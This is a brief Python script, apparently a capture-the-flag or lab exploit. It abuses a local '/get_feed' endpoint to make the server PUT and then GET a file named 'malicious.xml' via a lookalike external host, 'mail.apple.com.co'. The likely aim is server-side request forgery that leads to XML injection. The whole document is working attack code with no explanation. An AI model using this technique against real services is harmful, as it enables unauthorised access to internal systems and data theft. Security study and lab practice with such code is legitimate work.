import requests
import os
import string

TOKEN_CHARSET = string.ascii_letters + string.digits
TOKEN = ''.join(TOKEN_CHARSET[i%len(TOKEN_CHARSET)] for i in os.urandom(128))
URL = "http://localhost:8000/get_feed"
REFLECT_URL = "http://mail.apple.com.co"
FS_PORT = 8000
XML_NAME = 'malicious.xml'
XML_CONTENT = open(XML_NAME).read()


# 1. PUT a malicious xml file
print(requests.post(URL, json={
    'name': 'mal-xml',
    'method': 'PUT',
    'url': f'{REFLECT_URL}:{FS_PORT}/{XML_NAME}?token={TOKEN}',
    'data': XML_CONTENT
}).text)

# 2. GET the xml file
print(requests.post(URL, json={
    'name': 'mal-xml',
    'method': 'GET',
    'url': f'{REFLECT_URL}:{FS_PORT}/{XML_NAME}?token={TOKEN}',
    'data': XML_CONTENT
}).text)


